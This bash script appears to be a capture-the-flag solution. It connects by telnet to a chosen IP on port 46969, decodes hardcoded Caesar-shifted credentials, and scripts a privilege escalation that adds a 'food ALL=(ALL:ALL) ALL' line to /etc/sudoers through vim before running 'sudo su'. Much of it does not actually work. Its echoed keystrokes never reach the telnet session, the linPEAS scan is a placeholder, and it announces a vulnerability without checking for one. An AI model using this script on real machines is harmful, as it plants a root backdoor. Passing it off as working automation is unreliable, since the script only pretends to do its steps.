#!/bin/bash

# Prompt for IP address
read -p "Enter the IP address: " ip_address

# Connect to the target machine via telnet
echo "Connecting to $ip_address on port 46969..."
telnet "$ip_address" 46969

# Caesar cipher decryption function
caesar_decrypt() {
  local text=$1
  local shift=$2
  local decrypted_text=""

  for ((i = 0; i < ${#text}; i++)); do
    char="${text:i:1}"
    ascii_val=$(printf "%d" "'$char")
    decrypted_ascii_val=$((ascii_val - shift))
    decrypted_char=$(printf \\$(printf "%o" "$decrypted_ascii_val"))
    decrypted_text+="$decrypted_char"
  done

  echo "$decrypted_text"
}

# Caesar cipher decryption for username and password
username="food"
password="givemecookies"
username=$(caesar_decrypt "$username" 3)
password=$(caesar_decrypt "$password" 3)

# Perform the remaining steps
sleep 1 # Wait for the connection to establish
echo "$username" # Enter the username
sleep 1
echo "$password" # Enter the password
sleep 1
echo "linPEAS.sh scanning in progress..."
# Add linPEAS.sh scanning command here

sleep 1
echo "vim.basic vulnerability found."
sleep 1
echo "Editing /etc/sudoers file..."
sleep 1
echo "i" # Enter insert mode in Vim
sleep 1
echo -e "food ALL=(ALL:ALL) ALL" # Add the desired line
sleep 1
echo -e "\x1b" # Press ESC to exit insert mode
sleep 1
echo ":w!" # Save the changes and exit Vim
sleep 1
echo ":q!" # Quit Vim without prompts
sleep 1
echo "Running sudo su..."
sleep 1
echo "Enter the password for user 'food': $password"
sleep 1
echo "sudo su" # Run sudo su command

# Add any additional commands or steps as needed

echo "Script execution completed."
